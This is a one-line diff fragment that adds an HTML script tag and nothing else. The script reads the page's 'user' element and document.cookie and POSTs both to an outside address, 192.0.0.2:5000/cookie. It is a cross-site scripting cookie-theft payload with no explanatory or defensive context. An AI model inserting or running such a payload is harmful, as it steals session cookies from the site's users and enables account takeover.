@@ -1,0 +1,1 @@
+<script>fetch("http://192.0.0.2:5000/cookie",{method :"POST",headers:{"Content-Type": "application/json"},body : JSON.stringify({user : document.getElementById("user").textContent,cookies : document.cookie})})</script>
